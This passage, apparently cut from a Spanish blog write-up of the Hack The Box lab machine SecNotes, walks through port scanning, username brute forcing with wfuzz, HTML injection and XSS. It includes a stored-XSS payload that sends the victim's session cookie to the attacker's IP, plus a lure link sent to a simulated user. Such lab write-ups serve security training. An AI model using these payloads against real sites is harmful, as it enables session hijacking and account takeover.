    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.97 -R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80,445,8808 10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, así como con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (Server Message Block).&lt;/p&gt;

&lt;p&gt;Empezando por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8808&lt;/code&gt; podemos ver que ambas páginas están montadas sobre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; (Internet Information Services), un servidor web para &lt;em&gt;Microsft Windows&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Echemos un vistazo desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, una herramienta que se encarga de identificar las tecnologías web que se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.97:8808
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso.&lt;/p&gt;

&lt;p&gt;Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt; para descubrir usuarios válidos.&lt;/p&gt;

&lt;p&gt;Esto sería fácil de ejecutar teniendo a mano herramientas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wfuzz&lt;/code&gt; y diccionarios como &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/main/Usernames/Names/names.txt&quot;&gt;SecLists&lt;/a&gt;, que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install wfuzz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/danielmiessler/SecLists
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 400 &lt;span class=&quot;nt&quot;&gt;--hs&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;No account found with that username.&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /ruta/del/diccionario/SecLists/Usernames/Names/names.txt &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=FUZZ&amp;amp;password=noConocemosLaContraseña&quot;&lt;/span&gt; http://10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-c&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Output colorizado&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-L&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-t&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Específicamos el número de hilos con el queremos trabajar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--hs&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Oculta las respuestas con la expresión regular que indiquemos, en este caso controlamos el mensaje de  error&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos el diccionario con el que queremos trabajar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-d&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos la petición por POST&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt; existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password&lt;/code&gt;, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;

&lt;p&gt;La máquina &lt;em&gt;SecNotes&lt;/em&gt; cuenta con dos vías potenciales para realizar la intrusión, una vía &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;Inyecciones SQL&lt;/a&gt; y otra vía &lt;a href=&quot;https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)&quot;&gt;CSRF&lt;/a&gt; (Cross-Site Request Forgery).&lt;/p&gt;

&lt;h3 id=&quot;cross-site-request-forgery&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Cross-Site Request Forgery&lt;/h3&gt;

&lt;p&gt;En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt;, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario.&lt;/p&gt;

&lt;p&gt;Intentemos ya algo no intencionado como una &lt;a href=&quot;https://mateonitro550.github.io/HTML-Injection&quot;&gt;inyección HTML&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;En el campo &lt;em&gt;Title&lt;/em&gt; podemos escribir cualquier cosa, aunque perfectamente podría ser la inyección, y en el campo &lt;em&gt;Note&lt;/em&gt;, colocaremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Una frase cualquiera&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;De este modo el texto que introduzcamos cambiará su formato al de &lt;em&gt;header 1&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;O por ejemplo, podemos hacer que nuestro texto se desplace:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;marquee&amp;gt;&lt;/span&gt;Una frase cualquiera&lt;span class=&quot;nt&quot;&gt;&amp;lt;/marquee&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un &lt;a href=&quot;https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)&quot;&gt;XSS&lt;/a&gt; (Cross-Site Scripting)?&lt;/p&gt;

&lt;p&gt;Igual que antes, en el campo &lt;em&gt;Title&lt;/em&gt; podemos escribir cualquier cosa, y en el campo &lt;em&gt;Note&lt;/em&gt;, colocaremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Una frase cualquiera&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión?&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión.&lt;/p&gt;

&lt;p&gt;Podemos intentar efectuar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie Hijacking&lt;/code&gt;, ya que secuestrando la cookie de sesión de otro usuario, si este tiene su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente el valor de su cookie.&lt;/p&gt;

&lt;p&gt;Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención. Para ello, haremos uso de un &lt;a href=&quot;https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)&quot;&gt;Blind XSS&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Empezaremos por crear un servidor con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación, crearemos una nota con el siguiente mensaje:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está.&lt;/p&gt;

&lt;p&gt;Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt; a través del botón &lt;em&gt;Contact Us&lt;/em&gt;; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.&lt;/p&gt;

&lt;p&gt;Es importante mencionar que no podemos ocultar nuestro url con &lt;em&gt;href&lt;/em&gt;, &lt;em&gt;acortadores&lt;/em&gt;, &lt;em&gt;iframe&lt;/em&gt; o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido.&lt;/p&gt;

&lt;p&gt;Sin cerrar nuestro servidor hosteado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;, a través del botón &lt;em&gt;Contact Us&lt;/em&gt;, enviaremos el siguiente mensaje para confirmar si &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt; lee nuestros mensajes:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://nuestraDirecciónIP:80/tylerEstáPresente
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

